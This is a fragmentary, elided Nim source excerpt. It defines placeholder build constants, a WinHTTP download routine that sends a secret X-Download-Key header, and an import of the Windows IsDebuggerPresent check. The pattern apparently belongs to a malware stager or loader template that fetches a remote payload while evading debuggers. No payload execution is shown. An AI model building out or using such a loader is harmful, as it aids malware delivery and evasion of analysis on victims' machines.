...
const
  ...
  USE_TLS = USE_TLS_PLACEHOLDER
  DOWNLOAD_KEY = "DOWNLOAD_KEY_PLACEHOLDER"
...
proc download(host: LPCWSTR, port: INTERNET_PORT, path: LPCWSTR): tuple[buf: ptr byte, size: DWORD] =
  ...
  let hRequest = WinHttpOpenRequest(hConnect, "GET", path, nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
  if hRequest == nil:
    return
  ...
  let headerW = newWideCString("X-Download-Key: " & DOWNLOAD_KEY & "\r\n")
  if WinHttpAddRequestHeaders(hRequest, cast[LPCWSTR](&headerW[0]), cast[DWORD](-1), WINHTTP_ADDREQ_FLAG_ADD) == 0:
    return
...
proc IsDebuggerPresent(): WINBOOL {.importc, stdcall, dynlib: "kernel32".}
